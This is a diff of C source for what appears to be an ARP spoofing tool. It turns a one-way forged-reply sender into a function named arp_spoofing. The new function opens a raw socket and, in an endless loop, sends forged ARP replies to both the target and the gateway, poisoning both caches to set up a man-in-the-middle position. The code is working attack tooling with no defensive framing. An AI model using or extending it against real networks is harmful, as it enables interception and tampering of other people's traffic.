@@ -40,7 +40,7 @@ uint8_t* construct_arp_pac(int sock_r, struct sockaddr_ll socket_address, unsign
     free(arp_hdr);
     return arp_pac;
 }
-uint8_t* get_target_mac(int sock_r, struct sockaddr_ll socket_address, unsigned int addr_len,
+uint8_t* get_mac(int sock_r, struct sockaddr_ll socket_address, unsigned int addr_len,
                         uint8_t* my_mac, uint8_t* my_ip, uint8_t* target_ip){
 
     uint8_t* broadcast_mac = calloc(6, sizeof(uint8_t));
@@ -61,9 +61,9 @@ uint8_t* get_target_mac(int sock_r, struct sockaddr_ll socket_address, unsigned 
     do
     {
         if(!sendto(sock_r, arp_req, ARP_PACKET_LEN, 0, (struct sockaddr*) &socket_address, addr_len))
-            fprintf(stderr,"Error in getting target MAC...\n");
+            fprintf(stderr,"Error in getting MAC...\n");
         else
-            fprintf(stderr,"Getting target MAC...\n");
+            fprintf(stderr,"Getting MAC...\n");
         //sleep(3);
         byte_recv = recvfrom(sock_r, arp_rep, ARP_PACKET_LEN, 0, (struct sockaddr*) &socket_address, &addr_len);
         
@@ -80,10 +80,16 @@ uint8_t* get_target_mac(int sock_r, struct sockaddr_ll socket_address, unsigned 
         memset(arp_rep, 0, ARP_PACKET_LEN);
     } while(1);
 }
-void *send_arp_reply_fmac(void *args){
-    fprintf(stderr,"Check1\n");
+void *arp_spoofing(void *args){
+
+    int sock_r = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //socket arp attacking
+     if(sock_r < 0){
+        fprintf(stderr, "Error in creating raw socket\n");
+        exit(0);
+    }
     attacking_args_t *argument = (attacking_args_t*) args;
-    uint8_t* arp_rep = construct_arp_pac(argument->sock_r, argument->socket_address, argument->addr_len, argument->my_mac, argument->target_mac, argument->gateway_ip, argument->target_ip, ARPOP_REPLY);
+    uint8_t* arp_rep_target = construct_arp_pac(sock_r, argument->socket_address, argument->addr_len, argument->my_mac, argument->target_mac, argument->gateway_ip, argument->target_ip, ARPOP_REPLY);
+    uint8_t* arp_rep_gateway = construct_arp_pac(sock_r, argument->socket_address, argument->addr_len, argument->my_mac, argument->gateway_mac, argument->target_ip, argument->gateway_ip, ARPOP_REPLY);
     /*
     int i;
     for(i =0; i<ARP_PACKET_LEN;i++)
@@ -92,14 +98,15 @@ void *send_arp_reply_fmac(void *args){
    int count = 0;
     do
     {
-        if(!sendto(argument->sock_r, arp_rep, ARP_PACKET_LEN, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
+        if(!sendto(sock_r, arp_rep_target, ARP_PACKET_LEN, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len) || 
+            !sendto(sock_r, arp_rep_gateway, ARP_PACKET_LEN, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
             fprintf(stderr,"Error in sending ARP reply at time %d\n", count);
-        else
-        {
+        else{
             count++;
-            fprintf(stderr,"Send ARP reply %d time\n", count);
+            fprintf(stderr,"ARP Posioning...%d time\n", count);
         }
         sleep(1);
-    } while(count <= 100 );
-    free(arp_rep);
+    } while(1);
+    free(arp_rep_target);
+    free(arp_rep_gateway);
 }
